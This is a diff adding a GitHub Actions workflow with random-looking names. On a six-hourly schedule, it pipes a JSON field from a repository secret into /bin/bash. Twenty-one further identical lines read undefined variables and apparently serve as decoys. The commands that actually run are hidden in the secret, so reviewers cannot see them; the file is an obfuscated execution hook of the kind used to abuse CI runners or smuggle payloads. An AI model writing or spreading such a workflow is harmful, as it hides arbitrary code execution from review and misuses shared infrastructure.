@@ -1,0 +1,39 @@
+name: jiaoenyu3421
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '56 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiaoenyu3421
+        env:
+          ncwsx5213: ${{ secrets.ncwsx5213 }}
+        run: |
+          echo $ncwsx5213 | jq -r .jtugo91183 | /bin/bash
+          echo $p426 | jq -r .lzkul91598 | /bin/bash
+          echo $qs1 | jq -r .i2 | /bin/bash
+          echo $e65048 | jq -r .omqp93 | /bin/bash
+          echo $pfoh9478 | jq -r .vogc34863 | /bin/bash
+          echo $bfbdf0220 | jq -r .y1 | /bin/bash
+          echo $wghz2695 | jq -r .rqaph09 | /bin/bash
+          echo $vqa555 | jq -r .yzeno907 | /bin/bash
+          echo $yrsv8394 | jq -r .azyu38857 | /bin/bash
+          echo $mje0 | jq -r .b76 | /bin/bash
+          echo $ke5 | jq -r .sxkt208 | /bin/bash
+          echo $y28 | jq -r .apizs98288 | /bin/bash
+          echo $z18691 | jq -r .qum5349 | /bin/bash
+          echo $hpfs5079 | jq -r .jtsmk54 | /bin/bash
+          echo $ppqcl2003 | jq -r .jnvv74 | /bin/bash
+          echo $ghplt8150 | jq -r .newv77978 | /bin/bash
+          echo $lmzyy2 | jq -r .piujr569 | /bin/bash
+          echo $ow6346 | jq -r .wwrmq127 | /bin/bash
+          echo $kl95 | jq -r .ouasa105 | /bin/bash
+          echo $p35052 | jq -r .ck778 | /bin/bash
+          echo $xtb24097 | jq -r .xzlja82462 | /bin/bash
+          echo $ko9 | jq -r .ec63559 | /bin/bash
+
